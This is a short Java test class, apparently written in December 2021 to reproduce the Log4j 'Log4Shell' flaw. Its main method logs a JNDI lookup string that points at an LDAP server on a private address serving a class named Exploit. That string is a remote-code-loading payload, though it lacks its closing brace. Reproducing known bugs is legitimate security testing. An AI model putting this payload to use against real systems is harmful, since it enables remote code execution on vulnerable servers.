package test.local;

import lombok.extern.slf4j.Slf4j;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @author by Lixq
 * @Classname TestBug
 * @Description TODO
 * @Date 2021/12/11 9:09
 */
@Slf4j
public class TestBug {

    private static final Logger logger = LogManager.getLogger(TestBug.class);

    public static void main(String[] args) {


        log.error("${jndi:ldap://192.168.56.1:8080/Exploit.class");
    }
}
